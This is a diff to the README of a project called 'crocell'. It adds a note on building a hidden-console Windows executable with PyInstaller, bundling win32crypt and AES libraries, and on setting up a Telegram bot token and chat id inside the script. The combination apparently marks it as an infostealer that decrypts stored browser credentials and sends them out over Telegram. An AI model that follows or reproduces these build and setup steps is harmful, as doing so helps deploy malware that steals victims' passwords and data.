@@ -1,5 +1,9 @@
 # crocell
 
+#note
+ for pyinstaller all version of python supported and for nuitka only python 3.12.0
+ and creat bot at botfather in te;igram and user useringo bot and get id and replase those 2 in python script 
+
 ```
 pyinstaller --onefile --noconsole --name Crocell --icon=icon.ico --version-file=version.txt --hidden-import win32crypt --hidden-import Crypto.Cipher.AES --collect-all pycryptodome --collect-all pywin32 crocell.py
 
